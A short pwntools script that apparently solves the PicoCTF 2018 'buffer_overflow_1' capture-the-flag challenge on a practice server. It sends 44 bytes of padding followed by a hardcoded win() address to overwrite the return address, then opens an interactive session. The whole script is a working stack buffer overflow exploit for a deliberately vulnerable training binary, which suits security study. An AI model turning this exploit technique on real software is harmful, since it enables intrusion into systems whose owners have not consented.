#coding:utf-8
from pwn import *
import pwnlib
# sh = process("./PicoCTF_2018_buffer_overflow_1")
sh = remote("node3.buuoj.cn",27652)
elf = ELF("./PicoCTF_2018_buffer_overflow_1")
win_addr = 0x080485CB
payload = 'a' * 40 + 'a' *0x4 +  p32(win_addr)
sh.recvuntil("Please enter your string: \n")
# gdb.attach(sh)
# pause()
sh.sendline(payload)
sh.interactive()